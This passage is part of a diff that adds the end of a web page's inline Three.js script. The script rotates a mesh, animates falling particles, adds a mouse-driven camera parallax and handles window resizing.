+  const pts=new THREE.Points(pGeo,pMat);
+  scene.add(pts);
+
+  let mx=0,my=0;
+  document.addEventListener('mousemove',e=>{
+    mx=(e.clientX/window.innerWidth-0.5)*2;
+    my=(e.clientY/window.innerHeight-0.5)*2;
+  });
+
+  function animate(){
+    requestAnimationFrame(animate);
+    tkMesh.rotation.x+=0.002;
+    tkMesh.rotation.y+=0.003;
+    const pos=pts.geometry.attributes.position.array;
+    for(let i=0;i<pCount;i++){
+      pos[i*3+1]-=pVel[i];
+      if(pos[i*3+1]<-8){
+        pos[i*3+1]=8;
+        pos[i*3]=(Math.random()-0.5)*16;
+      }
+    }
+    pts.geometry.attributes.position.needsUpdate=true;
+    camera.rotation.y+=(mx*0.03-camera.rotation.y)*0.01;
+    camera.rotation.x+=(my*0.03-camera.rotation.x)*0.01;
+    renderer.render(scene,camera);
+  }
+  animate();
+
+  window.addEventListener('resize',()=>{
+    camera.aspect=window.innerWidth/window.innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth,window.innerHeight);
+  });
+})();
+</script>
+</body>
+</html>
